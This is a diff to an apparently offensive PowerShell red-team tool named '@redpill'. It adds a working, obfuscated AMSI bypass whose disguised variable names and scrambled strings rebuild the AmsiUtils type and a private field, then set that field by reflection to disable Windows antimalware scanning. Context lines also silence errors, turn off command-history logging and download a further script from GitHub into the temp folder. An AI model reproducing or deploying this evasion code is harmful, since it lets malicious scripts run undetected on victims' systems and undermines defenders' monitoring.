@@ -117,6 +117,7 @@
 ## Var declarations
 $CmdletVersion = "v1.2.6"
 $Remote_hostName = hostname
+$ErrorActionPreference = "SilentlyContinue"
 $OsVersion = [System.Environment]::OSVersion.Version
 $Working_Directory = pwd|Select-Object -ExpandProperty Path
 $host.UI.RawUI.WindowTitle = "@redpill $CmdletVersion {SSA@RedTeam}"
@@ -141,6 +142,22 @@ Clear-Host
 Write-Host "$Banner" -ForegroundColor Blue
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
+
+
+try {
+
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - 'AmsiStringDetectionBypass'
+   #>
+
+   $MsTeamsId = "4456625220575263174452554847"
+   $Drawing = "Sy@ste£.M@ana"+"ge£e@nt"+".Auto@£ati@on."+"A£s@i"+"U@ti@ls" -Join ''
+   $imgForm = $Drawing.Replace("@","").Replace("£","m");$Bitmap = [Ref].Assembly.GetType($imgForm)
+   $Graphics = [string](0..13|%{[char][int](53+($MsTeamsId).substring(($_*2),2))}) -Replace ' '
+   $i0Stream = $Bitmap.GetField($Graphics,'NonPublic,Static');$i0Stream.SetValue($null,$true)
+}catch{}
 
 
 If($Help -ieq "Parameters"){
@@ -249,7 +266,7 @@ If($Sysinfo -ieq "Enum" -or $Sysinfo -ieq "Verbose"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1 -Destination $Env:TMP\Sysinfo.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\Sysinfo.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 20){## Corrupted download detected => DefaultFileSize: 20,810546875/KB
+      If($SizeDump -lt 22){## Corrupted download detected => DefaultFileSize: 22,51171875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\Sysinfo.ps1"){Remove-Item -Path "$Env:TMP\Sysinfo.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
